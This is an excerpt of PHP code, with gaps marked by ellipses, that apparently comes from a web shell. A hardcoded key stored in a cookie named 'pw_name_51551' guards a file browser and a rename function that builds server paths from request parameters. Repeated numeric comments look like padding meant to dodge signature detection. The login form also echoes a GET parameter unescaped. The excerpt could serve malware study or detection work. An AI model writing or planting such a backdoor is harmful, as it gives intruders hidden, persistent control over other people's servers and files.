...
$auth_key = "038f1a539fad60ffc3f2de1c9a39a5bc";
...
$pass = false;
if (isset($_COOKIE['pw_name_51551'])) {
    if(($_COOKIE['pw_name_51551']) == $auth_key) {
        $pass = true;
    }
} else {
    if (isset($_POST['pw_name_51551'])) {
        if(($_POST['pw_name_51551']) == $auth_key) {
            setcookie("pw_name_51551", $_POST['pw_name_51551']);
            $pass = true;
        }
    }
}
if (!$pass) {
    die("<form action='?p=' method=post ><input type=password name='pw_name_51551' value='".$_GET['pw']."'  required><input type=submit name='watching' ></form>");
}
// ---- // 1739267198449050 1739267198282496 1739267198613220 1739267198622813
...
foreach ($paths as $id => $dir_part) {
    ...
    if ($dir_part == '')
        continue;// 1739267198449050 1739267198282496 1739267198613220 1739267198622813
    echo "<a href='?p=";
    for ($i = 0; $i <= $id; $i++) {
...
if (isset($_GET['r'])) {
    ...
    <form method="post">
        ...
        if (isset($_POST['rename'])) {// 1739267198449050 1739267198282496 1739267198613220 1739267198622813
            $name = PATH . "/" . $_GET['r'];
